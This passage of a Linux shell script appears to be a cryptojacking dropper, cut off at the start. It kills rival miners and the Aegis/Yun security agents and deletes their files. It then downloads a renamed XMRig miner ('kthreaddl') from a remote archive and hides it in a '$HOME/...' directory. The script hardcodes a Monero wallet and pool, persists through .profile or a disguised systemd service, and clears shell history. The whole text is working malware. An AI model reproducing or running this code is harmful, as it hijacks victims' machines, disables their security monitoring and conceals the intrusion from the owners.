    ${PS_CMD} aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
    netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    pkill -f pastebin
    pkill -f ssh-agent
    pkill -f 185.193.127.115
    pgrep -f monerohash | xargs -I % kill -9 %
    pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
    pgrep -f xzpauectgr | xargs -I % kill -9 %
    pgrep -f slxfbkmxtd | xargs -I % kill -9 %
    pgrep -f mixtape | xargs -I % kill -9 %
    pgrep -f addnj | xargs -I % kill -9 % 
    pgrep -f 200.68.17.196 | xargs -I % kill -9 %
    pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
    pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
    pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
    pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
    pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
    pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
    pgrep -f mqdsflm.cf | xargs -I % kill -9 %
    pgrep -f lower.sh | xargs -I % kill -9 %
    pgrep -f ./ppp | xargs -I % kill -9 %
    pgrep -f ./seervceaess | xargs -I % kill -9 %
    pgrep -f ./servceaess | xargs -I % kill -9 %
    pgrep -f ./servceas | xargs -I % kill -9 %
    pgrep -f ./servcesa | xargs -I % kill -9 %
    pgrep -f ./vsp | xargs -I % kill -9 %
    pgrep -f ./jvs | xargs -I % kill -9 %
    pgrep -f ./pvv | xargs -I % kill -9 %
    pgrep -f ./vpp | xargs -I % kill -9 %
    pgrep -f ./pces | xargs -I % kill -9 %
    pgrep -f ./rspce | xargs -I % kill -9 %
    pgrep -f ./haveged | xargs -I % kill -9 %
    pgrep -f ./jiba | xargs -I % kill -9 %
    pgrep -f ./watchbog | xargs -I % kill -9 %
    pgrep -f ./A7mA5gb | xargs -I % kill -9 %
    pgrep -f kacpi_svc | xargs -I % kill -9 %
    pgrep -f kswap_svc | xargs -I % kill -9 %
    pgrep -f kauditd_svc | xargs -I % kill -9 %
    pgrep -f kpsmoused_svc | xargs -I % kill -9 %
    pgrep -f kseriod_svc | xargs -I % kill -9 %
    pgrep -f kthreadd_svc | xargs -I % kill -9 %
    pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
    pgrep -f kintegrityd_svc | xargs -I % kill -9 %
    pgrep -f jawa | xargs -I % kill -9 %
    pgrep -f oracle.jpg | xargs -I % kill -9 %
    pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
    pgrep -f 188.209.49.54 | xargs -I % kill -9 %
    pgrep -f 181.214.87.241 | xargs -I % kill -9 %
    pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
    pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
    pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
    pgrep -f servim | xargs -I % kill -9 %
    pgrep -f kblockd_svc | xargs -I % kill -9 %
    pgrep -f native_svc | xargs -I % kill -9 %
    pgrep -f ynn | xargs -I % kill -9 %
    pgrep -f 65ccEJ7 | xargs -I % kill -9 %
    pgrep -f jmxx | xargs -I % kill -9 %
    pgrep -f 2Ne80nA | xargs -I % kill -9 %
    pgrep -f sysstats | xargs -I % kill -9 %
    pgrep -f systemxlv | xargs -I % kill -9 %
    pgrep -f watchbog | xargs -I % kill -9 %
    pgrep -f OIcJi1m | xargs -I % kill -9 %
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f devtools
    pkill -f systemctI
    pkill -f watchbog
    pkill -f sustes
    pkill -f xmrig
    pkill -f xmrig-cpu
    pkill -f 121.42.151.137
    pkill -f init12.cfg
    pkill -f nginxk
    pkill -f tmp/wc.conf
    pkill -f xmrig-notls
    pkill -f xmr-stak
    pkill -f suppoie
    pkill -f zer0day.ru
    pkill -f dbus-daemon--system
    pkill -f nullcrew
    pkill -f systemctI
    pkill -f kworkerds
    pkill -f init10.cfg
    pkill -f /wl.conf
    pkill -f crond64
    pkill -f sustse
    pkill -f vmlinuz
    pkill -f exin
    pkill -f apachiii
    pkill -f svcworkmanager
    pkill -f xr
    pkill -f trace
    pkill -f svcupdate
    pkill -f networkmanager
    pkill -f phpupdate
    ${CHATTR} -i -R /tmp
    rm -rf /usr/bin/config.json
    rm -rf /usr/bin/exin
    rm -rf /tmp/wc.conf
    rm -rf /tmp/log_rot
    rm -rf /tmp/apachiii
    rm -rf /tmp/sustse
    rm -rf /tmp/php
    rm -rf /tmp/p2.conf
    rm -rf /tmp/pprt
    rm -rf /tmp/ppol
    rm -rf /tmp/javax/config.sh
    rm -rf /tmp/javax/sshd2
    rm -rf /tmp/.profile
    rm -rf /tmp/1.so
    rm -rf /tmp/kworkerds
    rm -rf /tmp/kworkerds3
    rm -rf /tmp/kworkerdssx
    rm -rf /tmp/xd.json
    rm -rf /tmp/syslogd
    rm -rf /tmp/syslogdb
    rm -rf /tmp/65ccEJ7
    rm -rf /tmp/jmxx
    rm -rf /tmp/2Ne80nA
    rm -rf /tmp/dl
    rm -rf /tmp/ddg
    rm -rf /tmp/systemxlv
    rm -rf /tmp/systemctI
    rm -rf /tmp/.abc
    rm -rf /tmp/osw.hb
    rm -rf /tmp/.tmpleve
    rm -rf /tmp/.tmpnewzz
    rm -rf /tmp/.java
    rm -rf /tmp/.omed
    rm -rf /tmp/.tmpc
    rm -rf /tmp/.tmpleve
    rm -rf /tmp/.tmpnewzz
    rm -rf /tmp/gates.lod
    rm -rf /tmp/conf.n
    rm -rf /tmp/devtool
    rm -rf /tmp/devtools
    rm -rf /tmp/fs
    rm -rf /tmp/.rod
    rm -rf /tmp/.rod.tgz
    rm -rf /tmp/.rod.tgz.1
    rm -rf /tmp/.rod.tgz.2
    rm -rf /tmp/.mer
    rm -rf /tmp/.mer.tgz
    rm -rf /tmp/.mer.tgz.1
    rm -rf /tmp/.hod
    rm -rf /tmp/.hod.tgz
    rm -rf /tmp/.hod.tgz.1
    rm -rf /tmp/84Onmce
    rm -rf /tmp/C4iLM4L
    rm -rf /tmp/lilpip
    rm -rf /tmp/3lmigMo
    rm -rf /tmp/am8jmBP
    rm -rf /tmp/tmp.txt
    rm -rf /tmp/baby
    rm -rf /tmp/.lib
    rm -rf /tmp/systemd
    rm -rf /tmp/lib.tar.gz
    rm -rf /tmp/baby
    rm -rf /tmp/java
    rm -rf /tmp/j2.conf
    rm -rf /tmp/.mynews1234
    rm -rf /tmp/a3e12d
    rm -rf /tmp/.pt
    rm -rf /tmp/.pt.tgz
    rm -rf /tmp/.pt.tgz.1
    rm -rf /tmp/go
    rm -rf /tmp/java
    rm -rf /tmp/j2.conf
    rm -rf /tmp/.tmpnewasss
    rm -rf /tmp/java
    rm -rf /tmp/go.sh
    rm -rf /tmp/go2.sh
    rm -rf /tmp/khugepageds
    rm -rf /tmp/.censusqqqqqqqqq
    rm -rf /tmp/.kerberods
    rm -rf /tmp/kerberods
    rm -rf /tmp/seasame
    rm -rf /tmp/touch
    rm -rf /tmp/.p
    rm -rf /tmp/runtime2.sh
    rm -rf /tmp/runtime.sh
    rm -rf /dev/shm/z3.sh
    rm -rf /dev/shm/z2.sh
    rm -rf /dev/shm/.scr
    rm -rf /dev/shm/.kerberods
    rm -f /etc/ld.so.preload
    rm -f /usr/local/lib/libioset.so
    ${CHATTR} -i /etc/ld.so.preload
    rm -f /etc/ld.so.preload
    rm -f /usr/local/lib/libioset.so
    rm -rf /tmp/watchdogs
    rm -rf /etc/cron.d/tomcat
    rm -rf /etc/rc.d/init.d/watchdogs
    rm -rf /usr/sbin/watchdogs
    rm -f /tmp/kthrotlds
    rm -f /etc/rc.d/init.d/kthrotlds
    rm -rf /tmp/.sysbabyuuuuu12
    rm -rf /tmp/logo9.jpg
    rm -rf /tmp/miner.sh
    rm -rf /tmp/nullcrew
    rm -rf /tmp/proc
    rm -rf /tmp/2.sh
    rm /opt/atlassian/confluence/bin/1.sh
    rm /opt/atlassian/confluence/bin/1.sh.1
    rm /opt/atlassian/confluence/bin/1.sh.2
    rm /opt/atlassian/confluence/bin/1.sh.3
    rm /opt/atlassian/confluence/bin/3.sh
    rm /opt/atlassian/confluence/bin/3.sh.1
    rm /opt/atlassian/confluence/bin/3.sh.2
    rm /opt/atlassian/confluence/bin/3.sh.3
    rm -rf /var/tmp/f41
    rm -rf /var/tmp/2.sh
    rm -rf /var/tmp/config.json
    rm -rf /var/tmp/xmrig
    rm -rf /var/tmp/1.so
    rm -rf /var/tmp/kworkerds3
    rm -rf /var/tmp/kworkerdssx
    rm -rf /var/tmp/kworkerds
    rm -rf /var/tmp/wc.conf
    rm -rf /var/tmp/nadezhda.
    rm -rf /var/tmp/nadezhda.arm
    rm -rf /var/tmp/nadezhda.arm.1
    rm -rf /var/tmp/nadezhda.arm.2
    rm -rf /var/tmp/nadezhda.x86_64
    rm -rf /var/tmp/nadezhda.x86_64.1
    rm -rf /var/tmp/nadezhda.x86_64.2
    rm -rf /var/tmp/sustse3
    rm -rf /var/tmp/sustse
    rm -rf /var/tmp/moneroocean/
    rm -rf /var/tmp/devtool
    rm -rf /var/tmp/devtools
    rm -rf /var/tmp/play.sh
    rm -rf /var/tmp/systemctI
    rm -rf /var/tmp/.java
    rm -rf /var/tmp/1.sh
    rm -rf /var/tmp/conf.n
    rm -r /var/tmp/lib
    rm -r /var/tmp/.lib
    ${CHATTR} -iau /tmp/lok
    chmod +700 /tmp/lok
    rm -rf /tmp/lok
    sleep 1
    ${CHATTR}  -i /tmp/kdevtmpfsi
    echo 1 > /tmp/kdevtmpfsi
    ${CHATTR} +i /tmp/kdevtmpfsi
    sleep 1
    ${CHATTR}  -i /tmp/redis2
    echo 1 > /tmp/redis2
    ${CHATTR}  +i /tmp/redis2
    ${CHATTR}  -ia /.Xll/xr
    >/.Xll/xr
    ${CHATTR}  +ia /.Xll/xr
    ${CHATTR}  -ia /etc/trace
    >/etc/trace
    ${CHATTR}  +ia /etc/trace
    ${CHATTR}  -ia /etc/newsvc.sh
    ${CHATTR} -ia /etc/svc*
    ${CHATTR}  -ia /tmp/newsvc.sh
    ${CHATTR}  -ia /tmp/svc*
    >/etc/newsvc.sh
    >/etc/svcupdate
    >/etc/svcguard
    >/etc/svcworkmanager
    >/etc/svcupdates
    >/tmp/newsvc.sh
    >/tmp/svcupdate
    >/tmp/svcguard
    >/tmp/svcworkmanager
    >/tmp/svcupdates
    ${CHATTR} +ia /etc/newsvc.sh
    ${CHATTR} +ia /etc/svc*
    ${CHATTR} +ia /tmp/newsvc.sh
    ${CHATTR} +ia /tmp/svc*
    sleep 1
    ${CHATTR} -ia /etc/phpupdate
    ${CHATTR} -ia /etc/phpguard
    ${CHATTR} -ia /etc/networkmanager
    ${CHATTR} -ia /etc/newdat.sh
    >/etc/phpupdate
    >/etc/phpguard
    >/etc/networkmanager
    >/etc/newdat.sh
    ${CHATTR} +ia /etc/phpupdate
    ${CHATTR} +ia /etc/phpguard
    ${CHATTR} +ia /etc/networkmanager
    ${CHATTR} +ia /etc/newdat.sh
    ${CHATTR} -ia /etc/zzh
    ${CHATTR} -ia /etc/newinit
    >/etc/zzh
    >/etc/newinit
    ${CHATTR} +ia /etc/zzh
    ${CHATTR} +ia /etc/newinit
    sleep 1
    ${CHATTR} -i /usr/lib/systemd/systemd-update-daily
    echo 1 > /usr/lib/systemd/systemd-update-daily
    ${CHATTR} +i /usr/lib/systemd/systemd-update-daily
    ${CHATTR} -i /root/.tmp
    rm -rf /root/.tmp

    #yum install -y docker.io || apt-get install docker.io;
    docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
    docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
    #echo SELINUX=disabled >/etc/selinux/config

    ${PS_CMD} aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
    ${PS_CMD} aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
    rm -rf /usr/local/aegis
  
} 
kill_miner_proc 

#------------------------------------------------------------

function SetupNameServers(){	
    grep -q 8.8.8.8 /etc/resolv.conf || (${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null;)
    grep -q 8.8.4.4 /etc/resolv.conf || (${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null;)
} 
SetupNameServers 

#------------------------------------------------------------


PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi

if sudo -n true 2>/dev/null; then
  sudo systemctl stop kthreaddl.service
fi
killall -9 kthreaddl
rm -rf $HOME/...
echo "[*] Downloading advanced version of kthreaddl to /tmp/kthreaddl.tar.gz"
if ! curl -L "https://github.com/FuckerGod/s1344da/archive/refs/tags/a.tar.gz" -o /tmp/kthreaddl.tar.gz; then
  echo "ERROR: Can't download https://github.com/FuckerGod/s1344da/archive/refs/tags/a.tar.gz file to /tmp/kthreaddl.tar.gz"
  exit 1
fi
echo "[*] Unpacking /tmp/kthreaddl.tar.gz to $HOME/..."
[ -d $HOME/... ] || mkdir $HOME//...
if ! tar xf /tmp/kthreaddl.tar.gz -C $HOME//...; then
  echo "ERROR: Can't unpack /tmp/kthreaddl.tar.gz to $HOME//... directory"
  exit 1
fi
rm /tmp/kthreaddl.tar.gz
mv $HOME/.../s1344da-a/* $HOME/.../
rm -rf $HOME/.../s1344da-a
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.../config.json
ls $HOME/.../
chmod 777 $HOME/.../kthreaddl
$HOME/.../kthreaddl --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.../kthreaddl ]; then
    echo "WARNING: Advanced version of $HOME/.../kthreaddl is not functional"
  fi
  echo "ReDowloadGithubMaster"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/kthreaddl.tar.gz; then
    echo "ERROR: Can't download $LATEST_kthreaddl_LINUX_RELEASE file to /tmp/kthreaddl.tar.gz"
    exit 1
  fi
  if ! tar xf /tmp/kthreaddl.tar.gz -C $HOME/... --strip=1; then
    echo "WARNING: Can't unpack /tmp/kthreaddl.tar.gz to $HOME/... directory"
  fi
  rm /tmp/kthreaddl.tar.gz
  mv $HOME/.../xmrig $HOME/.../kthreaddl
  WALLET = "4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.../config.json
  sed -i 's/"url": *"[^"]*",/"url": "pool.minexmr.com:443",/' $HOME/.../config.json
  sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.../config.json
  sed -i 's/"tls": *"[^"]*",/"tls": true,/' $HOME/.../config.json
  sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 75,/' $HOME/.../config.json
  $HOME/.../kthreaddl --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/.../kthreaddl ]; then
      echo "ERROR: Stock version of $HOME/.../kthreaddl is not functional too"
    fi
    exit 1
  fi
fi

sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.../config.json
sed -i 's#"rig-id": *null,#"rig-id": "'$PASS'",#' $HOME/.../config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/.../.kthreaddl.log'",#' $HOME/.../config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.../config.json

cp $HOME/.../config.json $HOME/.../config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.../config_background.json

cat >$HOME/.../kthreaddl.sh <<EOL
#!/bin/bash
if ! pidof kthreaddl >/dev/null; then
  nice $HOME/.../kthreaddl \$*
else
  echo "System kthreaddl is already running in the background. Refusing to run another one."
  echo "Run \"killall kthreaddl\" or \"sudo killall kthreaddl\" if you want to remove background kthreaddl first."
fi
EOL
chmod +x $HOME/.../kthreaddl.sh
if ! sudo -n true 2>/dev/null; then
  if ! grep .../kthreaddl.sh $HOME/.profile >/dev/null; then
    echo "$HOME/.../kthreaddl.sh --config=$HOME/.../config_background.json >/dev/null 2>&1" >>$HOME/.profile
  fi
  /bin/bash $HOME/.../kthreaddl.sh --config=$HOME/.../config_background.json >/dev/null 2>&1
else
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then
    /bin/bash $HOME/.../kthreaddl.sh --config=$HOME/.../config_background.json >/dev/null 2>&1
  else
    cat >/tmp/kthreaddl.service <<EOL
[Unit]
Description=System kthreaddl service

[Service]
ExecStart=$HOME/.../kthreaddl --config=$HOME/.../config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
	echo 1 > /proc/sys/vm/drop_caches
	echo 2 > /proc/sys/vm/drop_caches
	echo 3 > /proc/sys/vm/drop_caches
    sudo mv /tmp/kthreaddl.service /etc/systemd/system/kthreaddl.service
    sudo killall kthreaddl 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable kthreaddl.service
    sudo systemctl start kthreaddl.service
  fi
fi
history -c
